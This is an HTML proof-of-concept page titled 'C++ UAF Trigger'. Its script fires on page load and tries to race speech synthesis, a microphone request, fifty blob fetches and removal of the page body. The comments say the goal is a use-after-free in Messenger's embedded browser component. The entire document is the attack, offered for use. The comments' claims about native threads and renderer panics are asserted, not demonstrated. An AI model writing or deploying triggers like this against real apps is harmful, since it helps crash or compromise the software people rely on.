<!DOCTYPE html>
<html>
<head><title>C++ UAF Trigger</title></head>
<body>
<script>
    function triggerNativeAsyncUAF() {
        // 1. Bind to the C++ Speech Synthesis engine
        // This runs asynchronously in a separate native thread
        let utterance = new SpeechSynthesisUtterance("A".repeat(5000));
        window.speechSynthesis.speak(utterance);

        // 2. Bind to the C++ Media IPC
        navigator.mediaDevices.getUserMedia({ audio: true }).catch(e => {});

        // 3. Spam massive Fetch API blobs to choke the C++ Network Service
        for(let i = 0; i < 50; i++) {
            fetch(window.location.href)
                .then(r => r.blob())
                .then(blob => blob.text());
        }

        // 4. Force the renderer to panic internally right as the Back button is hit
        setTimeout(() => {
            document.body.remove();
        }, 100);
    }

    // Give Messenger 300ms to fully attach the WebContents, then fire
    setTimeout(triggerNativeAsyncUAF, 300);
</script>
</body>
</html>
